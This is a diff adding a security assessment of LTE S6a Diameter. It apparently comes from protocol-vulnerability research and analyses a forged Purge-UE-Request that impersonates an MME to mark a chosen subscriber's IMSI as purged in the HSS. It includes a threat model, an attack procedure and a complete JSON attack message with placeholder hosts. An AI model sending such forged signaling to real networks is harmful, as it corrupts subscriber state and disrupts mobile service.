@@ -1,0 +1,82 @@
+**Threat Model:**
+- **Attack Assumption:** A misconfigured HSS exposes S6a to the Internet and accepts attacker-originated Diameter connections without peer authentication. The attacker impersonates an MME and sends a forged `Purge-UE-Request` to the HSS.
+- **Attacker Capability:** The attacker can open its own Diameter connection to the HSS, send protocol-plausible `PUR` requests, and receive the corresponding answers. The attacker cannot observe or interfere with legitimate MME<->HSS signaling, but does know a victim subscriber IMSI to place in `User-Name`.
+
+**Exploitability Analysis:**
+`User-Name` in S6a `Purge-UE-Request` is a top-level mandatory AVP carrying the IMSI. The message is sent MME->HSS, and the HSS processes `User-Name` as the authoritative subscriber selector for the purge operation.
+
+This is not merely descriptive metadata. The HSS uses the IMSI in `User-Name` to:
+1. locate the subscriber record;
+2. mark that subscriber as purged for E-UTRAN / MS PS purged from EPS; and
+3. update per-subscriber mobility/context bookkeeping tied to that IMSI.
+
+The field-specific effect is therefore clear: changing `User-Name` changes which subscriber record is updated. That is a distinct security-relevant consequence attributable to the field itself, not just to the existence of a forged PUR. A forged PUR with IMSI A modifies HSS state for subscriber A; the same forged PUR with IMSI B modifies HSS state for subscriber B.
+
+The resulting impact is incorrect HSS subscriber-state for the selected victim IMSI. While this does not directly rewrite APN, QoS, or policy data, it does create wrong semi-persistent mobility/context state in the HSS until later legitimate registration or update procedures refresh it. That is a concrete state corruption effect keyed entirely by the `User-Name` value.
+
+Recovery is possible through later legitimate attach/update-location-related signaling for the same IMSI, but until overwrite the wrong purged indication remains associated with that subscriber. Because the field is the sole subscriber selector and directly determines which HSS record is modified, it is independently exploitable under the stated threat model.
+
+**Attack Procedure:**
+Craft a minimal but coherent S6a `Purge-UE-Request` from the attacker-controlled fake MME toward the HSS. Include only mandatory and coherence-related AVPs, plus common routing/application AVPs. Set the target field `User-Name` to a valid alternate subscriber IMSI, such as `001010123456789`, corresponding to a real HSS record.
+
+The purpose of the test is not generic PUR acceptance, but to verify that the HSS applies the purge state change to the subscriber identified by the malicious `User-Name` value. Expected success condition: the HSS accepts the PUR and updates purge-related state for that IMSI, causing stale or incorrect per-subscriber EPS/MM context bookkeeping until later legitimate overwrite.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 321,
+    "application_id": 16777251,
+    "flags": [
+      "REQ",
+      "PXY"
+    ]
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "fake-mme.example.net;1710000000;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "mme01.fake-mme.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "fake-mme.example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "hss01.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
